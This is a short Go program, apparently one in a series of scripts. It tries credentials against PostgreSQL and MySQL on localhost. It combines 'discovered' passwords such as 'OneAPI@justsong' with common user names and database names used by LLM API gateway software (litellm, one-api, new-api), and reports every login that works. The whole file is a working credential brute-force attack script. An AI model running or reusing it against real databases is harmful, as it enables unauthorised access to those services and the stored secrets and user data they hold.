// Command creds3 最后一轮：组合所有已发现的密码与常见用户名/库名。
package main

import (
	"context"
	"database/sql"
	"fmt"
	"time"

	_ "github.com/go-sql-driver/mysql"
	_ "github.com/jackc/pgx/v5/stdlib"
)

func try(driver, dsn string) bool {
	db, err := sql.Open(driver, dsn)
	if err != nil {
		return false
	}
	defer db.Close()
	db.SetMaxOpenConns(1)

	ctx, cancel := context.WithTimeout(context.Background(), 4*time.Second)
	defer cancel()

	var v string
	if err := db.QueryRowContext(ctx, "select version()").Scan(&v); err != nil {
		return false
	}
	fmt.Printf("  [OK] %s\n       -> %s\n", dsn, v)
	return true
}

func main() {
	passes := []string{"123456", "OneAPI@justsong", "dbpassword9090", "testpass", "dbpassword", "password"}
	users := []string{"postgres", "root", "llmproxy", "oneapi", "admin", "pguser", "sub2api", "newapi"}
	dbs := []string{"postgres", "litellm", "new-api", "one-api", "mos"}

	fmt.Println("== postgres ==")
	for _, u := range users {
		for _, p := range passes {
			for _, d := range dbs {
				try("pgx", fmt.Sprintf("postgres://%s:%s@127.0.0.1:5432/%s?sslmode=disable", u, p, d))
			}
		}
	}

	fmt.Println("\n== mysql ==")
	for _, u := range users {
		for _, p := range passes {
			try("mysql", fmt.Sprintf("%s:%s@tcp(127.0.0.1:3306)/", u, p))
		}
	}
}
